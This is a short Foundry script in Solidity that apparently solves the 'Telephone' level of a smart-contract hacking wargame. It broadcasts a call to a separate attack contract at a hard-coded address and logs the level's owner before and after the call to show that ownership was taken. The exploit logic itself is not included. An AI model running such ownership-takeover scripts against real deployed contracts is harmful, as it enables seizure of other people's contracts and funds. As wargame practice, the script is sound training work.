// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/levels/Telephone.sol";
import {TelephoneAttack} from "../src/attacks/TelephoneAttack.sol";

contract TelephoneScript is Script {
    Telephone public instance = Telephone(payable(0x76dBBfdC31eC18BA43b41a4dEc531C7A41332fec));
    TelephoneAttack public attacker = TelephoneAttack(payable(0x17bA56747B13E2ed90E123208D127a624b943582));

    function run() external {
	vm.startBroadcast();
	console.log("Old owner:", instance.owner());
	console.log("Attacking...");
	attacker.attack();
	console.log("New owner:", instance.owner());
	vm.stopBroadcast();
    }
}
